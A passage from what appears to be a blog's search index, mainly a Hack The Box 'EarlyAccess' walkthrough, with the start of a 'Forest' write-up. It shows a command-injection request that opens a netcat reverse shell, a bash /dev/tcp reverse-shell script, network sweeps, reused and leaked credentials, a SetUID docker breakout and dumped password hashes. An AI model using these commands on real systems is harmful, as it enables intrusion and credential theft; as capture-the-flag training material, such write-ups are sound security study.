KQogICAgICAgICAgICAgICAgICAgIHRocm93IG5ldyBFeGNlcHRpb24oIk9ubHkgTUQ1IGFuZCBTSEExIGFyZSBjdXJyZW50bHkgc3VwcG9ydGVkISIpOwoKICAgICAgICAgICAgICAgICRoYXNoID0gaGFzaF9wdygkX1JFUVVFU1RbJ2hhc2hfZnVuY3Rpb24nXSwgJF9SRVFVRVNUWydwYXNzd29yZCddKTsKICAgICAgICAgICAgICAgIGlmKCFpc3NldCgkX1JFUVVFU1RbJ3JlZGlyZWN0J10pKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgIGVjaG8gIlJlc3VsdCBmb3IgSGFzaC1mdW5jdGlvbiAoIiAuICRfUkVRVUVTVFsnaGFzaF9mdW5jdGlvbiddIC4gIikgYW5kIHBhc3N3b3JkICgiIC4gJF9SRVFVRVNUWydwYXNzd29yZCddIC4gIik6PGJyPiI7CiAgICAgICAgICAgICAgICAgICAgZWNobyAnPGJyPicgLiAkaGFzaDsKICAgICAgICAgICAgICAgICAgICByZXR1cm47CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICBlbHNlCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJF9TRVNTSU9OWydoYXNoJ10gPSAkaGFzaDsKICAgICAgICAgICAgICAgICAgICBoZWFkZXIoJ0xvY2F0aW9uOiAvaG9tZS5waHA/dG9vbD1oYXNoaW5nJyk7CiAgICAgICAgICAgICAgICAgICAgcmV0dXJuOwogICAgICAgICAgICAgICAgfQogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQogICAgLy8gQWN0aW9uIG5vdCBzZXQsIGlnbm9yZQogICAgdGhyb3cgbmV3IEV4Y2VwdGlvbigiIik7Cn0KY2F0Y2goRXhjZXB0aW9uICRleCkKewogICAgaWYoJGV4LT5nZXRNZXNzYWdlKCkgIT09ICIiKQogICAgICAgICRfU0VTU0lPTlsnZXJyb3InXSA9IGh0bWxlbnRpdGllcygkZXgtPmdldE1lc3NhZ2UoKSk7CgogICAgaGVhZGVyKCdMb2NhdGlvbjogL2hvbWUucGhwJyk7CiAgICByZXR1cm47Cn0KPz4=&lt;h2&gt;Executed file successfully! \nDecode the base64 to a file locally, in my case called hash.php. Analyzing the code we see that there’s a hidden debug feature available. Playing around with it for a while I came up with this Burp Request to give a reverse shell:\nPOST /actions/hash.php HTTP/1.1\nHost: dev.earlyaccess.htb\nUser-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 91\nOrigin: http://dev.earlyaccess.htb\nConnection: close\nReferer: http://dev.earlyaccess.htb/home.php?tool=hashing\nCookie: PHPSESSID=077385c1956824d448397907ce455397\nUpgrade-Insecure-Requests: 1\n\naction=hash&redirect=true&password=nc -e /bin/sh 10.10.14.2 4488&hash_function=exec&debug=1\n┌──(void㉿void)-[~/Documents/shells/php]\n└─$ nc -lvnp 4488                                                                                                                  1 ⨯\nlistening on [any] 4488 ...\nconnect to [10.10.14.2] from (UNKNOWN) [10.10.11.110] 34528\nid && hostname\nuid=33(www-data) gid=33(www-data) groups=33(www-data)\nwebserver\n\n\n\nStep 7\nEnumerating the box manually we find mysql creds drew:drew in /var/www/html/.env, however we can’t do anything with them.\nLooking in /home/ we find user www-adm however no user.txt. As we have a few passwords, lets try a password re-use.\nwww-data@webserver:/home/www-adm$ su www-adm\nPassword: \nwww-adm@webserver:~$ id\nuid=1000(www-adm) gid=1000(www-adm) groups=1000(www-adm)\nWorking credentials: www-adm:gameover\nLooking in our home dir we find a new set of creds:\nwww-adm@webserver:~$ cat .wgetrc\nuser=api\npassword=s3CuR3_API_PW!\nWe could assume that we should connect to a API with the found creds, however we have yet to find a API during this challenge. Poking around we find that something responds when we call api on port 80.\nwww-adm@webserver:~$ nc api.earlyaccess.htb 80\n^CUnknown host\nwww-adm@webserver:~$ nc api 80                \napi [172.18.0.101] 80 (http) : Connection refused\nDo a port scan with netcat to find a active port.\nwww-adm@webserver:~$ nc -zv api 1-65500\nDNS fwd/rev mismatch: api != api.app_nw\napi [172.18.0.101] 5000 (?) open\nwww-adm@webserver:~$ curl api:5000\n{\"message\":\"Welcome to the game-key verification API! You can verify your keys via: /verify/&lt;game-key&gt;. If you are using manual verification, you have to synchronize the magic_num here. Admin users can verify the database using /check_db.\",\"status\":200}\nwww-adm@webserver:~$ curl api:\"s3CuR3_API_PW!\"@api:5000/check_db\n{\"message\":{\"AppArmorProfile\":\"docker-default\",\"Args\":[\"--character-set-server=utf8mb4\",\"--collation-server=utf8mb4_bin\",\"--skip-character-set-client-handshake\",\"--max_allowed_packet=50MB\",\"--general_log=0\",\"--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES\"],\"Config\":{\"AttachStderr\":false,\"AttachStdin\":false,\"AttachStdout\":false,\"Cmd\":[\"--character-set-server=utf8mb4\",\"--collation-server=utf8mb4_bin\",\"--skip-character-set-client-handshake\",\"--max_allowed_packet=50MB\",\"--general_log=0\",\"--sql_mode=ANSI_QUOTES,ERROR_FOR_DIVISION_BY_ZERO,IGNORE_SPACE,NO_ENGINE_SUBSTITUTION,NO_ZERO_DATE,NO_ZERO_IN_DATE,PIPES_AS_CONCAT,REAL_AS_FLOAT,STRICT_ALL_TABLES\"],\"Domainname\":\"\",\"Entrypoint\":[\"docker-entrypoint.sh\"],\"Env\":[\"MYSQL_DATABASE=db\",\"MYSQL_USER=drew\",\"MYSQL_PASSWORD=drew\",\"MYSQL_ROOT_PASSWORD=XeoNu86JTznxMCQuGHrGutF3Csq5\",\"SERVICE_TAGS=dev\",\"SERVICE_NAME=mysql\",\"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\",\"GOSU_VERSION=1.12\",\"MYSQL_MAJOR=8.0\",\"MYSQL_VERSION=8.0.25-1debian10\"],\"ExposedPorts\":{\"3306/tcp\":{},\"33060/tcp\":{}},\"Healthcheck\":{\"Interval\":5000000000,\"Retries\":3,\"Test\":[\"CMD-SHELL\",\"mysqladmin ping -h 127.0.0.1 --user=$MYSQL_USER -p$MYSQL_PASSWORD --silent\"],\"Timeout\":2000000000},\"Hostname\":\"mysql\",\"Image\":\"mysql:latest\",\"Labels\":{\"com.docker.compose.config-hash\":\"947cb358bc0bb20b87239b0dffe00fd463bd7e10355f6aac2ef1044d8a29e839\",\"com.docker.compose.container-number\":\"1\",\"com.docker.compose.oneoff\":\"False\",\"com.docker.compose.project\":\"app\",\"com.docker.compose.project.config_files\":\"docker-compose.yml\",\"com.docker.compose.project.working_dir\":\"/root/app\",\"com.docker.compose.service\":\"mysql\",\"com.docker.compose.version\":\"1.29.1\"},\"OnBuild\":null,\"OpenStdin\":false,\"StdinOnce\":false,\"Tty\":true,\"User\":\"\",\"Volumes\":{\"/docker-entrypoint-initdb.d\":{},\"/var/lib/mysql\":{}},\"WorkingDir\":\"\"},\"Created\":\"2021-09-16T13:38:13.822667973Z\",\"Driver\":\"overlay2\",\"ExecIDs\":null,\"GraphDriver\":{\"Data\":{\"LowerDir\":\"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521-init/diff:/var/lib/docker/overlay2/ecc064365b0367fc58ac796d9d5fe020d9453c68e2563f8f6d4682e38231083e/diff:/var/lib/docker/overlay2/4a21c5c296d0e6d06a3e44e3fa4817ab6f6f8c3612da6ba902dc28ffd749ec4d/diff:/var/lib/docker/overlay2/f0cdcc7bddc58609f75a98300c16282d8151ce18bd89c36be218c52468b3a643/diff:/var/lib/docker/overlay2/01e8af3c602aa396e4cb5af2ed211a6a3145337fa19b123f23e36b006d565fd0/diff:/var/lib/docker/overlay2/55b88ae64530676260fe91d4d3e6b0d763165505d3135a3495677cb10de74a66/diff:/var/lib/docker/overlay2/4064491ac251bcc0b677b0f76de7d5ecf0c17c7d64d7a18debe8b5a99e73e127/diff:/var/lib/docker/overlay2/a60c199d618b0f2001f106393236ba394d683a96003a4e35f58f8a7642dbad4f/diff:/var/lib/docker/overlay2/29b638dc55a69c49df41c3f2ec0f90cc584fac031378ae455ed1458a488ec48d/diff:/var/lib/docker/overlay2/ee59a9d7b93adc69453965d291e66c7d2b3e6402b2aef6e77d367da181b8912f/diff:/var/lib/docker/overlay2/4b5204c09ec7b0cbf22d409408529d79a6d6a472b3c4d40261aa8990ff7a2ea8/diff:/var/lib/docker/overlay2/8178a3527c2a805b3c2fe70e179797282bb426f3e73e8f4134bc2fa2f2c7aa22/diff:/var/lib/docker/overlay2/76b10989e43e43406fc4306e789802258e36323f7c2414e5e1242b6eab4bd3eb/diff\",\"MergedDir\":\"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521/merged\",\"UpperDir\":\"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521/diff\",\"WorkDir\":\"/var/lib/docker/overlay2/e2a82d8c17a053ab64dd4719fcb3b316fa7c4a7d13dce72c8b6386fe1baa1521/work\"},\"Name\":\"overlay2\"},\"HostConfig\":{\"AutoRemove\":false,\"Binds\":[\"/root/app/scripts/init.d:/docker-entrypoint-initdb.d:ro\",\"app_vol_mysql:/var/lib/mysql:rw\"],\"BlkioDeviceReadBps\":null,\"BlkioDeviceReadIOps\":null,\"BlkioDeviceWriteBps\":null,\"BlkioDeviceWriteIOps\":null,\"BlkioWeight\":0,\"BlkioWeightDevice\":null,\"CapAdd\":[\"SYS_NICE\"],\"CapDrop\":null,\"Cgroup\":\"\",\"CgroupParent\":\"\",\"CgroupnsMode\":\"host\",\"ConsoleSize\":[0,0],\"ContainerIDFile\":\"\",\"CpuCount\":0,\"CpuPercent\":0,\"CpuPeriod\":0,\"CpuQuota\":0,\"CpuRealtimePeriod\":0,\"CpuRealtimeRuntime\":0,\"CpuShares\":0,\"CpusetCpus\":\"\",\"CpusetMems\":\"\",\"DeviceCgroupRules\":null,\"DeviceRequests\":null,\"Devices\":null,\"Dns\":null,\"DnsOptions\":null,\"DnsSearch\":null,\"ExtraHosts\":null,\"GroupAdd\":null,\"IOMaximumBandwidth\":0,\"IOMaximumIOps\":0,\"IpcMode\":\"private\",\"Isolation\":\"\",\"KernelMemory\":0,\"KernelMemoryTCP\":0,\"Links\":null,\"LogConfig\":{\"Config\":{},\"Type\":\"json-file\"},\"MaskedPaths\":[\"/proc/asound\",\"/proc/acpi\",\"/proc/kcore\",\"/proc/keys\",\"/proc/latency_stats\",\"/proc/timer_list\",\"/proc/timer_stats\",\"/proc/sched_debug\",\"/proc/scsi\",\"/sys/firmware\"],\"Memory\":0,\"MemoryReservation\":0,\"MemorySwap\":0,\"MemorySwappiness\":null,\"NanoCpus\":0,\"NetworkMode\":\"app_nw\",\"OomKillDisable\":false,\"OomScoreAdj\":0,\"PidMode\":\"\",\"PidsLimit\":null,\"PortBindings\":{},\"Privileged\":false,\"PublishAllPorts\":false,\"ReadonlyPaths\":[\"/proc/bus\",\"/proc/fs\",\"/proc/irq\",\"/proc/sys\",\"/proc/sysrq-trigger\"],\"ReadonlyRootfs\":false,\"RestartPolicy\":{\"MaximumRetryCount\":0,\"Name\":\"always\"},\"Runtime\":\"runc\",\"SecurityOpt\":null,\"ShmSize\":67108864,\"UTSMode\":\"\",\"Ulimits\":null,\"UsernsMode\":\"\",\"VolumeDriver\":\"\",\"VolumesFrom\":[]},\"HostnamePath\":\"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/hostname\",\"HostsPath\":\"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/hosts\",\"Id\":\"2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b\",\"Image\":\"sha256:5c62e459e087e3bd3d963092b58e50ae2af881076b43c29e38e2b5db253e0287\",\"LogPath\":\"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b-json.log\",\"MountLabel\":\"\",\"Mounts\":[{\"Destination\":\"/docker-entrypoint-initdb.d\",\"Mode\":\"ro\",\"Propagation\":\"rprivate\",\"RW\":false,\"Source\":\"/root/app/scripts/init.d\",\"Type\":\"bind\"},{\"Destination\":\"/var/lib/mysql\",\"Driver\":\"local\",\"Mode\":\"rw\",\"Name\":\"app_vol_mysql\",\"Propagation\":\"\",\"RW\":true,\"Source\":\"/var/lib/docker/volumes/app_vol_mysql/_data\",\"Type\":\"volume\"}],\"Name\":\"/mysql\",\"NetworkSettings\":{\"Bridge\":\"\",\"EndpointID\":\"\",\"Gateway\":\"\",\"GlobalIPv6Address\":\"\",\"GlobalIPv6PrefixLen\":0,\"HairpinMode\":false,\"IPAddress\":\"\",\"IPPrefixLen\":0,\"IPv6Gateway\":\"\",\"LinkLocalIPv6Address\":\"\",\"LinkLocalIPv6PrefixLen\":0,\"MacAddress\":\"\",\"Networks\":{\"app_nw\":{\"Aliases\":[\"mysql\",\"2a285912567e\"],\"DriverOpts\":null,\"EndpointID\":\"cdc013f43c805abdca5bfedb447532433c8e53038fabc3bb1c5ca751d81eb80e\",\"Gateway\":\"172.18.0.1\",\"GlobalIPv6Address\":\"\",\"GlobalIPv6PrefixLen\":0,\"IPAMConfig\":{\"IPv4Address\":\"172.18.0.100\"},\"IPAddress\":\"172.18.0.100\",\"IPPrefixLen\":16,\"IPv6Gateway\":\"\",\"Links\":null,\"MacAddress\":\"02:42:ac:12:00:64\",\"NetworkID\":\"cbb68a9f4bde079475a89a8c2948fb188abf9caa5d7ccb2c1c50844dc9935b3e\"}},\"Ports\":{\"3306/tcp\":null,\"33060/tcp\":null},\"SandboxID\":\"e9b084f4253b9d40bdd32b1c18ef6fddd03977dddcfbb8d3422bfef7d89d3e3c\",\"SandboxKey\":\"/var/run/docker/netns/e9b084f4253b\",\"SecondaryIPAddresses\":null,\"SecondaryIPv6Addresses\":null},\"Path\":\"docker-entrypoint.sh\",\"Platform\":\"linux\",\"ProcessLabel\":\"\",\"ResolvConfPath\":\"/var/lib/docker/containers/2a285912567e4b48bb934e43abb604821db2d249c24d21be1e4a7847368ab53b/resolv.conf\",\"RestartCount\":0,\"State\":{\"Dead\":false,\"Error\":\"\",\"ExitCode\":0,\"FinishedAt\":\"0001-01-01T00:00:00Z\",\"Health\":{\"FailingStreak\":0,\"Log\":[{\"End\":\"2021-09-16T16:17:49.677779624+02:00\",\"ExitCode\":0,\"Output\":\"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\\nmysqld is alive\\n\",\"Start\":\"2021-09-16T16:17:49.591002515+02:00\"},{\"End\":\"2021-09-16T16:17:54.762145333+02:00\",\"ExitCode\":0,\"Output\":\"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\\nmysqld is alive\\n\",\"Start\":\"2021-09-16T16:17:54.681668413+02:00\"},{\"End\":\"2021-09-16T16:17:59.846907812+02:00\",\"ExitCode\":0,\"Output\":\"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\\nmysqld is alive\\n\",\"Start\":\"2021-09-16T16:17:59.76533343+02:00\"},{\"End\":\"2021-09-16T16:18:04.934944592+02:00\",\"ExitCode\":0,\"Output\":\"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\\nmysqld is alive\\n\",\"Start\":\"2021-09-16T16:18:04.849003146+02:00\"},{\"End\":\"2021-09-16T16:18:10.017393625+02:00\",\"ExitCode\":0,\"Output\":\"mysqladmin: [Warning] Using a password on the command line interface can be insecure.\\nmysqld is alive\\n\",\"Start\":\"2021-09-16T16:18:09.937871649+02:00\"}],\"Status\":\"healthy\"},\"OOMKilled\":false,\"Paused\":false,\"Pid\":1097,\"Restarting\":false,\"Running\":true,\"StartedAt\":\"2021-09-16T13:38:17.332306321Z\",\"Status\":\"running\"}},\"status\":200}\nIn the output we find SQL root creds - drew:XeoNu86JTznxMCQuGHrGutF3Csq5\nLogin with SSH and grab user.txt\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ ssh drew@earlyaccess.htb\n..\ndrew@earlyaccess:~$ id && hostname\nuid=1000(drew) gid=1000(drew) groups=1000(drew)\nearlyaccess\n\ndrew@earlyaccess:~$ cat user.txt \nb6ca7af4c496986e5632265206169ea4\n\n\n\n\nROOT\n\nStep 1\nEnumerating manually (and with linpeas) we quickly find that /opt/docker-entrypoint.d/ is owned by group drew, testing to add content in the directory reveals that it’s auto cleaned frequently.\ndrew@earlyaccess:~$ ./linpeas.sh \n..\n..\n╔══════════╣ Active Ports\n╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#open-ports\ntcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN         \ntcp        0      0 0.0.0.0:443             0.0.0.0:*               LISTEN   \ntcp        0      0 0.0.0.0:8443            0.0.0.0:*               LISTEN  \ntcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN  \n..\n..\n╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)\n╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation#writable-files\n  Group drew:\n/opt/docker-entrypoint.d\nPort 8443 is new to us, but we are unable to access it.\ndrew@earlyaccess:/opt/docker-entrypoint.d$ curl -k https://127.0.0.1:8443\ncurl: (7) Failed to connect to 127.0.0.1 port 8443: Connection refused\n\nIptables rules:\n*filter\n-A INPUT -p tcp -m tcp --dport 8443 -j REJECT --reject-with tcp-reset\nAfter some further enumeration we find a mail from game-adm in /var/mail/drew &gt;To: drew@earlyaccess.htb Subject: Game-server crash fixes From: game-adm game-adm@earlyaccess.htb Date: Thu May 27 8:10:34 2021 &gt; Hi Drew! &gt; Thanks again for taking the time to test this very early version of our newest project! We have received your feedback and implemented a healthcheck that will automatically restart the game-server if it has crashed (sorry for the current instability of the game! We are working on it…) If the game hangs now, the server will restart and be available again after about a minute. &gt; If you find any other problems, please don’t hesitate to report them! &gt; Thank you for your efforts! Game-adm (and the entire EarlyAccess Studios team).\nMy guess here is that we should crash the game server, thus restarting the service and running scripts in /opt/docker-entrypoint.d/ - where we will put our own evil.sh script.\n\n\n\nStep 2\nSo we’re looking for a game-server. We can assume it’s in one of the three docker networks:\n3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default \n    link/ether 02:42:0e:38:a3:58 brd ff:ff:ff:ff:ff:ff\n    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0\n       valid_lft forever preferred_lft forever\n4: br-cbb68a9f4bde: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default \n    link/ether 02:42:e3:e7:9c:c2 brd ff:ff:ff:ff:ff:ff\n    inet 172.18.0.1/16 brd 172.18.255.255 scope global br-cbb68a9f4bde\n       valid_lft forever preferred_lft forever\n5: br-34ef5fd49320: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc noqueue state UP group default \n    link/ether 02:42:60:7b:7f:e1 brd ff:ff:ff:ff:ff:ff\n    inet 172.19.0.1/16 brd 172.19.255.255 scope global br-34ef5fd49320\n       valid_lft forever preferred_lft forever\nThe webserver that we have access to previously (User Step 7) was on 172.18.0.102 and the API 172.18.0.101, so probably everything related to web is on that subnet. Hopefully, all the other hosts are on 172.1X.__0__.XXX, we can do a ping sweep loop and try to find any hosts.\ndrew@earlyaccess:/var/mail$ for i in {2..254} ;do (ping -c 1 172.17.0.$i | grep \"bytes from\" &) ;done\ndrew@earlyaccess:/var/mail$ for i in {2..254} ;do (ping -c 1 172.18.0.$i | grep \"bytes from\" &) ;done\n64 bytes from 172.18.0.2: icmp_seq=1 ttl=64 time=0.065 ms\n64 bytes from 172.18.0.101: icmp_seq=1 ttl=64 time=0.108 ms\n64 bytes from 172.18.0.100: icmp_seq=1 ttl=64 time=0.070 ms\n64 bytes from 172.18.0.102: icmp_seq=1 ttl=64 time=0.068 ms\ndrew@earlyaccess:/var/mail$ for i in {2..254} ;do (ping -c 1 172.19.0.$i | grep \"bytes from\" &) ;done\n64 bytes from 172.19.0.2: icmp_seq=1 ttl=64 time=0.128 ms\n64 bytes from 172.19.0.4: icmp_seq=1 ttl=64 time=0.106 ms\nScan the hosts with nc to find open ports.\ndrew@earlyaccess:/var/mail$ nc -zvn 172.19.0.4 1-65500\ndrew@earlyaccess:/var/mail$ nc -zvn 172.19.0.2 1-65500\n(UNKNOWN) [172.19.0.2] 9999 (?) open\n(UNKNOWN) [172.19.0.2] 22 (ssh) open\ndrew@earlyaccess:/var/mail$ nc -zvn 172.18.0.100 1-65500\n(UNKNOWN) [172.18.0.100] 33060 (?) open\n(UNKNOWN) [172.18.0.100] 3306 (mysql) open\ndrew@earlyaccess:/var/mail$ nc -zvn 172.18.0.101 1-65500\n(UNKNOWN) [172.18.0.101] 5000 (?) open\ndrew@earlyaccess:/var/mail$ nc -zvn 172.18.0.102 1-65500\n(UNKNOWN) [172.18.0.102] 443 (https) open\n(UNKNOWN) [172.18.0.102] 80 (http) open\n172.19.0.2:9999 looks like it could be our game-server.\ndrew@earlyaccess:/var/mail$ curl http://172.19.0.2:9999\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"en\"&gt;\n    &lt;head&gt;\n        &lt;title&gt;Rock v0.0.1&lt;/title&gt;\n    &lt;/head&gt;\n    &lt;body&gt;\n        &lt;div class=\"container\"&gt;\n            &lt;div class=\"panel panel-default\"&gt;\n                &lt;div class=\"panel-heading\"&gt;&lt;h1&gt;Game version v0.0.1&lt;/h1&gt;&lt;/div&gt;\n                    &lt;div class=\"panel-body\"&gt;\n                        &lt;div class=\"card header\"&gt;\n                            &lt;div class=\"card-header\"&gt;\n                                Test-environment for Game-dev\n                            &lt;/div&gt;\n                            &lt;div&gt;\n                                &lt;h2&gt;Choose option&lt;/h2&gt;\n                                &lt;div&gt;\n                                    &lt;a href=\"/autoplay\"&gt;&lt;img src=\"x\" alt=\"autoplay\"&lt;/a&gt;\n                                    &lt;a href=\"/rock\"&gt;&lt;img src=\"x\" alt=\"rock\"&gt;&lt;/a&gt; \n                                    &lt;a href=\"/paper\"&gt;&lt;img src=\"x\" alt=\"paper\"&gt;&lt;/a&gt;\n                                    &lt;a href=\"/scissors\"&gt;&lt;img src=\"x\" alt=\"scissors\"&gt;&lt;/a&gt;\n                                &lt;/div&gt;\n                                &lt;h3&gt;Result of last game:&lt;/h3&gt;\n                                \n                            &lt;/div&gt;\n                        &lt;/div&gt;\n                    &lt;/div&gt;\n                &lt;/div&gt;\n            &lt;/div&gt;\n        &lt;/div&gt;\n    &lt;/body&gt;\n&lt;/html&gt;\n\n\n\nStep 3\nIf we cURL the game-server and tries to make it autoplay, maybe we can start so many instances that it crashes.\ndrew@earlyaccess:/var/mail$ curl -v http://172.19.0.2:9999/autoplay\n..\n&lt;div class=\"card-body\"&gt;\n    &lt;form action=\"/autoplay\" method=\"POST\"&gt;\n        &lt;ul style=\"list-style-type: none\"&gt;\n            &lt;li&gt;\n                &lt;label for=\"rounds\"&gt;Rounds:&lt;/label&gt;\n                &lt;input type=\"number\" placeholder=\"3\" value=\"3\" name=\"rounds\" min=\"1\" max=\"100\"&gt;\n                &lt;button id=\"btn\" class=\"btn btn-outline-dark center play-btn\" onclick=\"\"&gt;Start game&lt;/button&gt;\n            &lt;/li&gt;\n            &lt;li&gt;\n                &lt;label for=\"verbose\"&gt;Verbose&lt;/label&gt;\n                &lt;input type=\"checkbox\" name=\"verbose\" id=\"verbose\" value=\"false\"&gt;\n            &lt;/li&gt;\n        &lt;/ul&gt;\n    &lt;/form&gt;\n&lt;/div&gt;\ndrew@earlyaccess:/dev/shm$ curl -X POST http://172.19.0.2:9999/autoplay -d \"rounds=3&verbose=true\"\n&lt;html&gt;&lt;body&gt;&lt;h1&gt;Starting autoplay with 3 rounds&lt;/h1&gt;&lt;p&gt;&lt;h3&gt;Playing round: 1&lt;/h3&gt;\nOutcome of round: loss&lt;/p&gt;\n&lt;p&gt;&lt;h3&gt;Playing round: 2&lt;/h3&gt;\nOutcome of round: win&lt;/p&gt;\n&lt;p&gt;&lt;h3&gt;Playing round: 3&lt;/h3&gt;\nOutcome of round: loss&lt;/p&gt;\n&lt;h4&gt;Stats:&lt;/h4&gt;&lt;p&gt;Wins: 1&lt;/p&gt;&lt;p&gt;Losses: 2&lt;/p&gt;&lt;p&gt;Ties: 0&lt;/p&gt;&lt;a href=\"/autoplay\"&gt;Go back&lt;/a&gt;&lt;/body&gt;&lt;/html&gt;\nCrash the application by entering a invalid (decimal) value. Upload our evil.sh reverse shell to /etc/docker-entrypoint.d and capture the incoming shell.\nNote: /etc/docker-entrypoint.d is cleared regularly, so keep re-creating evil.sh if it’s removed before the game-server restarts.\ndrew@earlyaccess:/dev/shm$ curl -X POST http://172.19.0.2:9999/autoplay -d \"rounds=99.999999999&verbose=true\"\ndrew@earlyaccess:/opt/docker-entrypoint.d$ echo -e '#!/bin/bash\\nbash -i &gt;& /dev/tcp/10.10.14.5/4488 0&gt;&1' &gt; evil.sh && chmod +x evil.sh\n\n┌──(void㉿void)-[/git/htb/earlyaccess]\n└─$ nc -lvnp 4488                             \nlistening on [any] 4488 ...\nconnect to [10.10.14.5] from (UNKNOWN) [10.10.11.110] 42248\nbash: cannot set terminal process group (1): Inappropriate ioctl for device\nbash: no job control in this shell\nroot@game-server:/usr/src/app# id && hostname\nid && hostname\nuid=0(root) gid=0(root) groups=0(root)\ngame-server\n\n\n\nStep 4\nWe are in a unprivileged docker, unable to run docker-commands, capsh-commands or mounting directories. Looking in mount we can see that /dev/sda1 is already mounted to /docker-entrypoint.d\nroot@game-server:/docker-entrypoint.d# mount\n..\n/dev/sda1 on /docker-entrypoint.d type ext4 (rw,relatime,errors=remount-ro)\nThis means that we can moves files and/or scripts from the game-server, to the host machine. And since we are root on the docker/game-server, we are able to use ‘SetUID’ bit to make scripts execute like root on the host machine.\nroot@game-server:/docker-entrypoint.d# cp /bin/bash . && chmod u+s bash\nroot@game-server:/docker-entrypoint.d# cp /bin/sh . && chmod u+s sh\n\ndrew@earlyaccess:/opt/docker-entrypoint.d$ ls -al\ntotal 1204\ndrwxrwxr-t 2 root drew    4096 Sep 30 13:42 .\ndrwxr-xr-x 4 root root    4096 Jul 14 12:26 ..\n-rwsr-xr-x 1 root root 1099016 Sep 30 13:42 bash\n-rwsr-xr-x 1 root root  117208 Sep 30 13:42 sh\n\ndrew@earlyaccess:/opt/docker-entrypoint.d$ ./bash\n./bash: error while loading shared libraries: libtinfo.so.5: cannot open shared object file: No such file or directory\ndrew@earlyaccess:/opt/docker-entrypoint.d$ ./sh\n# id && hostname\nuid=1000(drew) gid=1000(drew) euid=0(root) groups=1000(drew)\nearlyaccess\n\n# cat /root/root.txt\na3537b30eb1073d19779ae81448520ee\n\n# cat /etc/shadow\nroot:$6$2QbMgoSoxCmfitM7$fivhckW6N0Qk8Y3.RDUy8iFKm/BcwEUkUDwKZa5s3LC6bhJuBwPxaqUpUJ76oOiI10i7CfcpPj1CcwVWsRLoz/:18871:0:99999:7:::\ndrew:$6$AADwRDsC1bSDK3pl$IixXS9pA.Gl3wLIkGCERTSE9tBeZtpRkw.gipzq9Z/MgKmh3mpgSG7TySc3EFyUfKH7B4VoJo3OtSPVwP627Q0:18771:0:99999:7:::\ngame-adm:$6$SlEudWDN76ied096$2sRRXzh/aT.0dlO6liqqNdHrrOoZHgJXf1c4dHsXByibZvSsYG3wy7vIQQnJpNpphZAGVYTp0Sf5QzHk1JA8a1:18822:0:99999:7:::\n\n\n\n\nREFERENCES\nExploit LFI / RFI: https://github.com/qazbnm456/awesome-security-trivia/blob/master/Tricky-ways-to-exploit-PHP-Local-File-Inclusion.md\nNC Port scan: https://www.cyberciti.biz/faq/linux-port-scanning/\nPing Sweep Loop: https://www.rubyguides.com/2012/02/cli-ninja-ping-sweep/\nDocker, Writable Folder: https://book.hacktricks.xyz/linux-unix/privilege-escalation/docker-breakout#mount-writable-folder"
  },
  {
    "objectID": "posts/2019-10-16-htb-writeup-forest/2019-10-16-htb-writeup-forest.html",
    "href": "posts/2019-10-16-htb-writeup-forest/2019-10-16-htb-writeup-forest.html",
    "title": "Forest - Hack The Box",
    "section": "",
    "text": "“Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry’s standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum.”\n\n██╗ ██╗███████╗███████╗██████╗ ██║ ██║██╔════╝██╔════╝██╔══██╗ ██║ ██║███████╗█████╗ ██████╔╝ ██║ ██║╚════██║██╔══╝ ██╔══██╗ ╚██████╔╝███████║███████╗██║ ██║ ╚═════╝ ╚══════╝╚══════╝╚═╝ ╚═╝\n\nnmap -Pn -sC -sV -n 10.10.10.161 PORT STATE SERVICE VERSION 53/tcp open domain? 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2019-10-15 13:10:10Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp 